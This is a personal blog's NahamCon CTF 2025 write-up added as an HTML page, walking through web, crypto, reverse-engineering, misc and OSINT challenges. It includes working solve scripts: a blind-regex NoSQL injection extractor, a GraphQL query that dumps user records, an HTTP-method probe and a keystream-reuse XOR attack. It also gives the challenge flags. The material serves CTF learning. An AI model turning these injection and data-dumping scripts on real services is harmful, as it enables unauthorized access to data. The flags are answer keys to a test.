@@ -1,0 +1,407 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>NahamCon CTF 2025 | 4ry</title>
+    <link rel="stylesheet" href="../styles.css">
+  </head>
+  <body>
+    <aside class="sidebar">
+      <a class="brand" href="../index.html" aria-label="Home"><img class="avatar" src="../assets/avatar.jpg" alt=""><span class="site-title">4ry</span></a>
+      <nav class="nav" aria-label="Primary navigation"><a class="nav-link" href="../index.html"><span>⌂</span>Home</a><a class="nav-link" href="../categories/index.html"><span>☰</span>Categories</a><a class="nav-link" href="/music/"><span>♪</span>Music</a><a class="nav-link" href="../about/index.html"><span>ⓘ</span>About</a></nav>
+      <div class="socials" aria-label="Social links"><button class="theme-toggle" type="button" aria-label="Toggle light mode">◐</button><a href="https://github.com/akmlalff" aria-label="GitHub"><img class="social-icon" src="../assets/icons/github.svg" alt=""></a><a href="https://www.linkedin.com/in/akmalaliff" aria-label="LinkedIn"><img class="social-icon" src="../assets/icons/linkedin.svg" alt=""></a><a href="mailto:akmalaliff@gmail.com" aria-label="Email"><img class="social-icon" src="../assets/icons/email.svg" alt=""></a><a href="https://open.spotify.com/user/22ixrbtx4wsrufvosaf2gf3ty?si=6948217fbb694f00" aria-label="Spotify"><img class="social-icon" src="../assets/icons/spotify.svg" alt=""></a></div>
+    </aside>
+    <main class="shell">
+      <header class="topbar"><div><a class="crumb" href="../index.html">Home</a><span class="muted"> › CTF › NahamCon CTF 2025</span></div><label class="search"><span>⌕</span><input id="searchInput" type="search" placeholder="Search..."></label></header>
+      <div class="layout">
+        <article class="content article">
+          <header class="article-header"><h1>NahamCon CTF 2025</h1><div class="article-meta"><span>May 25, 2025</span><span>CTF</span><span>NahamCon CTF 2025 / Writeup</span></div></header>
+          <div class="article-body"><h2>Writeup NahamCon CTF 2025 - G3n0s</h2>
+<h3>Table of Contents</h3>
+<h4>Web Exploitation</h4>
+<ol>
+<li><a href="#Naham-Commencement-2025">Naham-Commencement 2025</a></li>
+<li><a href="#NoSequel">NoSequel</a></li>
+<li><a href="#SNAD">SNAD</a></li>
+<li><a href="#Method-In-The-Madness">Method In The Madness</a></li>
+<li><a href="#The-Mission-(Group-Challenge">The Mission (Group Challenge)</a>)</li>
+</ol>
+<p>i. <a href="#The-Mission-Flag-#1">The Mission-Flag #1</a></p>
+<p>ii. <a href="#The-Mission-Flag-#4">The Mission-Flag #4</a></p>
+<p>ii. <a href="#The-Mission-Flag-#6-(Bonus">The Mission-Flag #6 (Bonus)</a>)</p>
+<h4>Reverse Engineering</h4>
+<ol>
+<li><a href="#What&#39;s-a-base-amongst-friends?">What&#39;s a base amongst friends?</a></li>
+</ol>
+<h4>Cryptography</h4>
+<ol>
+<li><a href="#Cryptoclock">Cryptoclock</a></li>
+</ol>
+<h4>Misc</h4>
+<ol>
+<li><a href="#The-Oddyssey">The Oddyssey</a></li>
+<li><a href="#The-Martian">The Martian</a></li>
+<li><a href="#Screenshot">Screenshot</a></li>
+</ol>
+<h4>Osint</h4>
+<ol>
+<li><a href="#Taken-to-School">Taken to School</a></li>
+</ol>
+<hr>
+<h3>Web Exploitation</h3>
+<h4 id="Naham-Commencement-2025">Naham-Commencement 2025</h4>
+<blockquote>Author: @HuskyHacks</blockquote>
+<h4>Description</h4>
+<blockquote>I don&#39;t believe in updating my computer, it just takes so long! Besides, no one could ever hack me, I use good passwords!</blockquote>
+<blockquote>Welcome, Naham-Hacker Class of 2025! This challenge is your official CTF opening ceremony. Enjoy the CTF, play fair, play smart, and get those flags! BEGIN! 📯</blockquote>
+<blockquote>(True story: NahamSec originally contracted me to built the actual NahamCon site. I showed this to him as a prototype and he said &quot;you know, let&#39;s actually move you to the CTF dev team...&quot;)</blockquote>
+<blockquote>NOTE, we have noticed an odd gimmick with this challenge -- if you seem to repeatedly see a message An error occurred while processing your request., try changing how you connect to the Internet in case any provider oddities are getting in the way.</blockquote>
+<blockquote>http://challenge.nahamcon.com:31977</blockquote>
+<h4>Solution</h4>
+<p>Saw this line of the code in main.js</p>
+<pre><code class="language-bash">document.addEventListener(&#39;DOMContentLoaded&#39;, function () {
+    const x1 = &quot;dqxqcius&quot;; //username
+    const x2 = &quot;YeaTtgUnzezBqiwa2025&quot;; //password
+    const k = &quot;nahamcon&quot;; // most likely a key</code></pre>
+<p>dqxqcius (Caesar cipher)</p>
+<figure><img src="../assets/writeups/nahamcon-ctf-2025/Images/img1.png" alt="Caesar Cipher"><figcaption>Caesar Cipher</figcaption></figure>
+<p>YeaTtgUnzezBqiwa2025 + nahamcon (Vigenere cipher)</p>
+<figure><img src="../assets/writeups/nahamcon-ctf-2025/Images/img2.png" alt="Vigenere Cipher"><figcaption>Vigenere Cipher</figcaption></figure>
+<p>login with the credentials</p>
+<figure><img src="../assets/writeups/nahamcon-ctf-2025/Images/img3.png" alt="login"><figcaption>login</figcaption></figure>
+<p>Flag:</p>
+<pre><code class="language-bash">flag{c419dfe3a0a621edc0150a133bb7a34c}</code></pre>
+<hr>
+<h4 id="NoSequel">NoSequel</h4>
+<blockquote>Author: @HuskyHacks</blockquote>
+<h4>Description</h4>
+<blockquote>It always struck me as odd that none of these movies ever got sequels! Absolute cinema.</blockquote>
+<blockquote>http://challenge.nahamcon.com:32138</blockquote>
+<h4>Solution</h4>
+<figure><img src="../assets/writeups/nahamcon-ctf-2025/Images/img4.png" alt="NoSequel"><figcaption>NoSequel</figcaption></figure>
+<p>It says that the queries will NOT work on the Movies collection but WILL work on the Flags collection So, we need to steal the secret flag stored as a document in the Flags collection.</p>
+<p>Using blind‐regex NoSQL injection against the Flags collection, you can fully reconstruct the hidden flag and complete the challenge.</p>
+<p>solve.py</p>
+<pre><code class="language-bash">import requests
+import string
+
+URL = &quot;http://challenge.nahamcon.com:32138/search&quot;
+CHARSET = string.ascii_lowercase + string.ascii_uppercase + string.digits + &quot;_{}&quot;
+
+def matches(prefix):
+    # build the regex query for “does flag start with prefix?”
+    query = f&#39;flag: {{$regex: &quot;^{prefix}&quot;}}&#39;
+    data = {&quot;collection&quot;: &quot;flags&quot;, &quot;query&quot;: query}
+    r = requests.post(URL, data=data)
+    return &quot;Pattern matched&quot; in r.text
+
+flag = &quot;&quot;
+# we know it starts “flag{”
+flag = &quot;flag{&quot;
+
+while not flag.endswith(&quot;}&quot;):
+    for c in CHARSET:
+        if matches(flag + c):
+            flag += c
+            print(&quot;Found so far:&quot;, flag)
+            break
+    else:
+        print(&quot;No match found for next character? Something’s off.&quot;)
+        break
+
+print(&quot;Complete flag:&quot;, flag)
+
+// Found so far: flag{4cb8649d9ecb0ec59d1784263602e686{</code></pre>
+<p>Flag:</p>
+<pre><code class="language-bash">flag{4cb8649d9ecb0ec59d1784263602e686}</code></pre>
+<hr>
+<h4 id="SNAD">SNAD</h4>
+<blockquote>Author: @HuskyHacks</blockquote>
+<h4>Description</h4>
+<blockquote>No, it&#39;s not a typo. It&#39;s not sand. It&#39;s SNAD. There&#39;s a difference!</blockquote>
+<blockquote>http://challenge.nahamcon.com:31136/</blockquote>
+<h4>Solution</h4>
+<figure><img src="../assets/writeups/nahamcon-ctf-2025/Images/img5.png" alt="snad"><figcaption>snad</figcaption></figure>
+<p>The script.js attaches injectSand and other functions/variables to window, meaning they can be called directly from the browser console, like:</p>
+<pre><code class="language-bash">
+function setup() {
+    createCanvas(windowWidth, windowHeight),
+    resetGrid(),
+
+    document.addEventListener(&quot;keydown&quot;, function(e) {
+        &quot;t&quot; === e.key &amp;&amp; (targetIndicatorsVisible = !targetIndicatorsVisible),
+        &quot;x&quot; === e.key &amp;&amp; toggleGravity()
+    }),
+
+    // These lines expose internal functions and variables to the global `window` object
+    window.injectSand = injectSand,
+    window.toggleGravity = toggleGravity,
+    window.particles = particles,
+    window.targetPositions = targetPositions,
+    window.checkFlag = checkFlag
+}</code></pre>
+<p>insert this into console and you’ll get the flag</p>
+<pre><code class="language-bash">injectSand(367, 238, 0)
+injectSand(412, 293, 40)
+injectSand(291, 314, 60)
+injectSand(392, 362, 120)
+injectSand(454, 319, 240)
+injectSand(349, 252, 280)
+injectSand(433, 301, 320)</code></pre>
+<figure><img src="../assets/writeups/nahamcon-ctf-2025/Images/img6.png" alt="snadflag"><figcaption>snadflag</figcaption></figure>
+<p>Flag:</p>
+<pre><code class="language-bash">flag {6ff0c72ad11bf174139e970559d9b5d2} </code></pre>
+<hr>
+<h4 id="Method-In-The-Madness">Method In The Madness</h4>
+<blockquote>Author: BuildHackSecure @ HackingHub</blockquote>
+<h4>Description</h4>
+<blockquote>HackingHub has provided this CTF challenge!</blockquote>
+<blockquote>http://challenge.nahamcon.com:32500</blockquote>
+<h4>Solution</h4>
+<figure><img src="../assets/writeups/nahamcon-ctf-2025/Images/img7.png" alt="method"><figcaption>method</figcaption></figure>
+<p>By looking at its name of the challenge and the checkboxes it makes me think of http methods so I made a script to try all http methods</p>
+<pre><code class="language-bash">import requests
+
+URL = &quot;http://challenge.nahamcon.com:32500/interesting&quot;  # replace with actual URL
+
+methods = [&#39;GET&#39;, &#39;POST&#39;, &#39;PUT&#39;, &#39;DELETE&#39;, &#39;PATCH&#39;, &#39;OPTIONS&#39;, &#39;HEAD&#39;, &#39;TRACE&#39;]
+
+for method in methods:
+    response = requests.request(method, URL)
+    print(f&quot;{method} → {response.status_code}&quot;)
+    try:
+        print(response.text)
+    except:
+        print(&quot;[Non-text response]&quot;)</code></pre>
+<figure><img src="../assets/writeups/nahamcon-ctf-2025/Images/img8.png" alt="methodflag"><figcaption>methodflag</figcaption></figure>
+<p>And there we go we got the flag</p>
+<pre><code class="language-bash">flag{bd399cb9c3a8b857588d8e13f490b6fd}</code></pre>
+<hr>
+<h4 id="The-Mission-(Group-Challenge">The Mission (Group Challenge)</h4>
+<blockquote>Author: BuildHackSecure @ HackingHub</blockquote>
+<h4>Description</h4>
+<blockquote>HackingHub has provided this CTF challenge!</blockquote>
+<blockquote>This is the container control panel card for the The Mission challenge group. Use this same container for all five flags to be uncovered. For that reason, this challenge card intentionally has no points. You may submit flag{} to mark this as complete at your leisure.</blockquote>
+<blockquote>Welcome to the BugBounty platform, you&#39;ve submitted a report for Yahoo but oh no!! So has STÖK and it looks like you&#39;re going to get dupped!</blockquote>
+<blockquote>Hack into the platform and change STÖK&#39;s report to duplicate first so you can grab the bounty!</blockquote>
+<blockquote>You can login with the follow details:</blockquote>
+<blockquote>Username: hacker</blockquote>
+<blockquote>Password: password123</blockquote>
+<blockquote>Submit the first flag you uncover within this challenge.</blockquote>
+<blockquote>http://challenge.nahamcon.com:31630/</blockquote>
+<figure><img src="../assets/writeups/nahamcon-ctf-2025/Images/img9.png" alt="Bugbounty"><figcaption>Bugbounty</figcaption></figure>
+<h4 id="The-Mission-Flag-#1">The Mission - Flag #1</h4>
+<h4>Solution</h4>
+<p>messed around with the url and I put /robots.txt and got the flag</p>
+<figure><img src="../assets/writeups/nahamcon-ctf-2025/Images/img10.png" alt="missionflag1"><figcaption>missionflag1</figcaption></figure>
+<pre><code class="language-bash">flag_1{858c82dc956f35dd1a30c4d47bcb57fb}</code></pre>
+<hr>
+<h4 id="The-Mission-Flag-#4">The Mission - Flag #4</h4>
+<h4>Solution</h4>
+<figure><img src="../assets/writeups/nahamcon-ctf-2025/Images/img11.png" alt="GraphSQL"><figcaption>GraphSQL</figcaption></figure>
+<p>I saw that there is an exposure of GraphQL so I tried to get the database</p>
+<pre><code class="language-bash">curl -s -X POST http://challenge.nahamcon.com:31630/api/v2/graphql \
+  -H &quot;Content-Type: application/json&quot; \
+  -d &#39;{&quot;query&quot;:&quot;{ users { id username email } }&quot;}&#39; \
+  | jq -r &#39;.data.users[] | &quot;ID: \(.id) | Username: \(.username) | Email: \(.email)&quot;&#39;</code></pre>
+<p>and i got this</p>
+<pre><code class="language-bash">ID: 359fb73c-cbe8-4b1b-b7d9-fa26c4ed1f0b | Username: nahamsec | Email: nahamsec@bugbounty.ctf
+ID: 5b2d7302-a424-4c41-9412-b378acedda08 | Username: rhynorater | Email: rhynorater@bugbounty.ctf
+ID: 15ee453d-18c7-419b-a3a6-ef8f2cc1271f | Username: stok | Email: flag_4{253a82878df615bb9ee32e573dc69634}
+ID: 4d513e52-a79a-417a-8199-cc091220f340 | Username: shubs | Email: shubs@bugbounty.ctf
+ID: bbccd010-bbd0-4b48-9c34-f4e151c4d9e4 | Username: fattselimi | Email: fattselimi@bugbounty.ctf
+ID: 30ec2071-eb96-4785-9a9a-c79b438f6181 | Username: insiderphd | Email: insiderphd@bugbounty.ctf
+ID: cbba1083-0b54-4b66-aafd-350eea037d38 | Username: inti | Email: inti@bugbounty.ctf
+ID: 874d18fc-3479-4cae-a915-01b0bb7a6c49 | Username: renniepak | Email: renniepak@bugbounty.ctf
+ID: fd55a401-b110-4821-9155-add4653cb992 | Username: hacker | Email: hacker@bugbounty.ctf</code></pre>
+<p>Flag</p>
+<pre><code class="language-bash">flag_4{253a82878df615bb9ee32e573dc69634} </code></pre>
+<hr>
+<h4 id="The-Mission-Flag-#6-(Bonus">The Mission - Flag #6</h4>
+<h4>Solution</h4>
+<figure><img src="../assets/writeups/nahamcon-ctf-2025/Images/img12.png" alt="Bot"><figcaption>Bot</figcaption></figure>
+<p>Asked for a hint from the bot and it says impersonation technique</p>
+<figure><img src="../assets/writeups/nahamcon-ctf-2025/Images/img13.png" alt="Bot2"><figcaption>Bot2</figcaption></figure>
+<p>And the bot sent this too</p>
+<figure><img src="../assets/writeups/nahamcon-ctf-2025/Images/img14.png" alt="Bot3"><figcaption>Bot3</figcaption></figure>
+<p>So I impersonated him</p>
+<p>Flag</p>
+<pre><code class="language-bash">flag_6{9c2001f18f3b997187c9eb6d8c96ba60}</code></pre>
+<hr>
+<h3>Reverse Engineering</h3>
+<h4 id="What&#39;s-a-base-amongst-friends?">What&#39;s A Base Amongs Friends ?</h4>
+<blockquote>Author: @Kkevsterrr</blockquote>
+<h4>Description</h4>
+<blockquote>What&#39;s a base amongst friends though, really?</blockquote>
+<blockquote>Attachments: whats-a-base</blockquote>
+<h4>Solution</h4>
+<p>Ran the file and it asked me to give a password</p>
+<figure><img src="../assets/writeups/nahamcon-ctf-2025/Images/img17.png" alt="RE1"><figcaption>RE1</figcaption></figure>
+<p>After analyzing the file extract the z-base-32 blob</p>
+<pre><code class="language-bash">strings -a whats-a-base \
+  | grep -Eo &#39;[ybndrfg8ejkmcpqxot1uwisza345h769]{50,}&#39;
+
+//rsm7xzr7muqtxsr3m8pfzf6h5ep738ez5ncftss7d1cftskz49qj4zg7n9cizgez5upbzzr7n9cjosg45wqjosg3mu</code></pre>
+<p>Decode it</p>
+<pre><code class="language-bash">echo -n m7xzr7muqtxsr3m8pfzf6h5ep738ez5ncftss7d1cftskz49qj4zg7n9cizgez5upbzzr7n9cjosg45wqjosg3mu \
+  | tr &#39;ybndrfg8ejkmcpqxot1uwisza345h769&#39; &#39;ABCDEFGHIJKLMNOPQRSTUVWXYZ234567&#39; \
+  | base32 –decode
+
+// __rust_begin_short_backtrace__rust_end_short_backtraces</code></pre>
+<p>Run the file and put the decoded password</p>
+<figure><img src="../assets/writeups/nahamcon-ctf-2025/Images/img18.png" alt="RE2"><figcaption>RE2</figcaption></figure>
+<p>Flag</p>
+<pre><code class="language-bash">flag{50768fcb270edc499750ea64dc45ee92}  </code></pre>
+<hr>
+<h3>Cryptography</h3>
+<h4 id="Cryptoclock">Cryptolock</h4>
+<blockquote>Author: @JohnHammond</blockquote>
+<h4>Description</h4>
+<blockquote>Just imagine it, the Cryptoclock!! Just like you&#39;ve seen in the movies, a magical power to be able to manipulate the world&#39;s numbers across time!!</blockquote>
+<blockquote>nc challenge.nahamcon.com 31927</blockquote>
+<blockquote>Attachments: server.py</blockquote>
+<h4>Solution</h4>
+<pre><code class="language-bash">(base) ┌─[✗]─[@parrot]─[~/Desktop]
+└──╼ $nc challenge.nahamcon.com 31927
+Welcome to Cryptoclock!
+The encrypted flag is: 9b10822569980148af9bd9ba7b06ea10d30ab972f9078e1e9afd0226b0c8008dfba47e89a0b9
+Enter text to encrypt (or &#39;quit&#39; to exit):</code></pre>
+<p>solve.py</p>
+<pre><code class="language-bash">#!/usr/bin/env python3
+import socket
+import sys
+
+HOST = &#39;challenge.nahamcon.com&#39;
+PORT = 31927
+
+def xor_bytes(a: bytes, b: bytes) -&gt; bytes:
+    return bytes(x ^ y for x, y in zip(a, b))
+
+def recv_until(sock, delim=b&#39;\n&#39;) -&gt; bytes:
+    buf = b&#39;&#39;
+    while not buf.endswith(delim):
+        chunk = sock.recv(1)
+        if not chunk:
+            raise RuntimeError(&quot;Connection closed&quot;)
+        buf += chunk
+    return buf
+
+def main():
+    s = socket.create_connection((HOST, PORT))
+    # 1) Read welcome &amp; encrypted flag line
+    #    Welcome to Cryptoclock!
+    recv_until(s)  
+    line = recv_until(s)  # &quot;The encrypted flag is: efdc13...&lt;newline&gt;&quot;
+    # parse hex
+    prefix = b&quot;The encrypted flag is: &quot;
+    assert line.startswith(prefix)
+    enc_flag_hex = line[len(prefix):].strip()
+    enc_flag = bytes.fromhex(enc_flag_hex.decode())
+    flag_len = len(enc_flag)
+
+    # skip the &quot;Enter text to encrypt...&quot; prompt
+    recv_until(s)
+
+    # 2) Send zero‐bytes payload to recover keystream
+    payload = b&#39;\x00&#39; * flag_len
+    s.sendall(payload + b&#39;\n&#39;)
+
+    # 3) Read back &quot;Encrypted: &lt;hex&gt;&quot;
+    resp = recv_until(s)
+    assert resp.startswith(b&quot;Encrypted: &quot;)
+    ks_hex = resp.split(b&quot;Encrypted: &quot;,1)[1].strip()
+    keystream = bytes.fromhex(ks_hex.decode())
+    assert len(keystream) == flag_len
+
+    # 4) XOR to get flag
+    flag = xor_bytes(enc_flag, keystream)
+    print(&quot;Recovered flag:&quot;, flag.decode())
+
+    s.close()
+
+if __name__ == &#39;__main__&#39;:
+    main()
+
+// Recovered flag: flag{0e42ba180089ce6e3bb50e52587d3724}</code></pre>
+<p>Flag</p>
+<pre><code class="language-bash">flag{0e42ba180089ce6e3bb50e52587d3724}</code></pre>
+<hr>
+<h3>Miscellaneous</h3>
+<h4 id="The-Oddyssey">The Oddyssey</h4>
+<blockquote>Author: @HuskyHacks</blockquote>
+<h4>Description</h4>
+<blockquote>Remember reading The Odyssey in high school? Well I sure don&#39;t, because I never did my homework. But I really wanted to get back into the classics and give it a fair shake. The problem is I have a fourth grade reading level and that book is waaaaaay too long.</blockquote>
+<blockquote>To solve this, I made a server that reads out tiny chunks of The Odyssey, one at a time, so I can take my time reading it! How is Odysseus gonna get himself out of this one?</blockquote>
+<blockquote>nc challenge.nahamcon.com 32441</blockquote>
+<h4>Solution</h4>
+<figure><img src="../assets/writeups/nahamcon-ctf-2025/Images/img15.png" alt="odyssey1"><figcaption>odyssey1</figcaption></figure>
+<p>Press continue until the end and search for the flag</p>
+<figure><img src="../assets/writeups/nahamcon-ctf-2025/Images/img16.png" alt="odyssey2"><figcaption>odyssey2</figcaption></figure>
+<p>Flag</p>
+<pre><code class="language-bash">flag{0b51aae6b09b85d1bb13b0b8c3003a6a} </code></pre>
+<hr>
+<h4 id="The-Martian">The Martian</h4>
+<blockquote>Author: @John Hammond</blockquote>
+<h4>Description</h4>
+<blockquote>Wow, this file looks like it&#39;s from outta this world!</blockquote>
+<blockquote>Attachments: challenge.martian</blockquote>
+<h4>Solution</h4>
+<p>Checked binwalk and extract all the files</p>
+<pre><code class="language-bash">(base) ┌─[@parrot]─[~/Desktop]
+└──╼ $binwalk -e challenge.martian
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+52            0x34            bzip2 compressed data, block size = 900k
+12511         0x30DF          bzip2 compressed data, block size = 900k
+32896         0x8080          bzip2 compressed data, block size = 900k
+38269         0x957D          bzip2 compressed data, block size = 900k
+50728         0xC628          bzip2 compressed data, block size = 900k</code></pre>
+<p>And extracted an image with the flag</p>
+<figure><img src="../assets/writeups/nahamcon-ctf-2025/Images/img19.png" alt="martian"><figcaption>martian</figcaption></figure>
+<p>Flag</p>
+<pre><code class="language-bash">flag {0db031ac265b3e6538aff0d9f456004f}</code></pre>
+<hr>
+<h4 id="Screenshot">Screenshot</h4>
+<blockquote>Author: @John Hammond</blockquote>
+<h4>Description</h4>
+<blockquote>Oh shoot! I accidentally took a screenshot just as I accidentally opened the dump of a flag.zip file in a text editor! Whoopsies, what a crazy accidental accident that just accidented!</blockquote>
+<blockquote>Well anyway, I think I remember the password was just password!</blockquote>
+<blockquote>Attachments:  Screenshot.png</blockquote>
+<h4>Solution</h4>
+<figure><img src="../assets/writeups/nahamcon-ctf-2025/Images/img21.png" alt="hex"><figcaption>hex</figcaption></figure>
+<p>Copy paste the hex</p>
+<figure><img src="../assets/writeups/nahamcon-ctf-2025/Images/img22.png" alt="cyberchef"><figcaption>cyberchef</figcaption></figure>
+<p>Put it in cyberchef and save as zip file</p>
+<figure><img src="../assets/writeups/nahamcon-ctf-2025/Images/img23.png" alt="schoolflag"><figcaption>schoolflag</figcaption></figure>
+<p>You,ll get a flag file</p>
+<p>Flag</p>
+<pre><code class="language-bash">flag{907e5bb257cd5fc818e88a13622f3d46}</code></pre>
+<hr>
+<h3>Osint</h3>
+<h4 id="Taken-to-School">Taken to School</h4>
+<blockquote>Author: @Jstith</blockquote>
+<h4>Description</h4>
+<blockquote>&quot;I was reading the news this week, and I saw that a student tried to hack a school&#39;s computer system!&quot; a worried professor remarked to an IT employee during lunch. &quot;I&#39;m glad we&#39;ve got people like you keeping our network safe.&quot; While Bob the IT admin appreciated the warm comment, his stomach dropped. &quot;Dang it.. I haven&#39;t checked that firewall since we set it up months ago!&quot;.</blockquote>
+<blockquote>IT has pulled a log file of potentially anomalous events detected by the new (albeit poorly tuned) network security software for your school. Based on open-sourced intelligence (OSINT), identify the anomalous entry in the file.</blockquote>
+<blockquote>Each log entry contains a single line, including an MD5 hash titled eventHash.</blockquote>
+<blockquote>The challenge flag is flag{MD5HASH} containing the eventHash of the anomalous entry.</blockquote>
+<blockquote>Attachments: network-log.cef</blockquote>
+<h4>Solution</h4>
+<figure><img src="../assets/writeups/nahamcon-ctf-2025/Images/img20.png" alt="school"><figcaption>school</figcaption></figure>
+<p>This is what is inside the network-log.cef</p>
+<p>check each src IP if malicious with VirusTotal API,</p>
+<p>I tried almost all of the malicious IP and the flag is the event with IP 91.218.50.11,</p>
+<pre><code class="language-bash">2024-12-22T15:07:40 CEF:0|PaloAltoNetworks|PAN-OS|8.3|44985|Trojan Signature Match|9|src=91.218.50.11 dst=192.168.113.2 spt=27660 dpt=443 proto=HTTPS act=allowed fileName=chemistry_notes.pdf eventHash=5b16c7044a22ed3845a0ff408da8afa9 cs1Label=threatType cs1=trojan</code></pre>
+<p>Flag</p>
+<pre><code class="language-bash">flag{5b16c7044a22ed3845a0ff408da8afa9}</code></pre>
+<hr></div>
+        </article>
+        <aside class="right-rail"><section><h2>Recently Updated</h2><div id="recentPosts" class="rail-list"></div></section></aside>
+      </div>
+    </main>
+    <script src="../posts-data.js?v=clean-descriptions"></script>
+    <script src="../script.js"></script>
+  </body>
+</html>
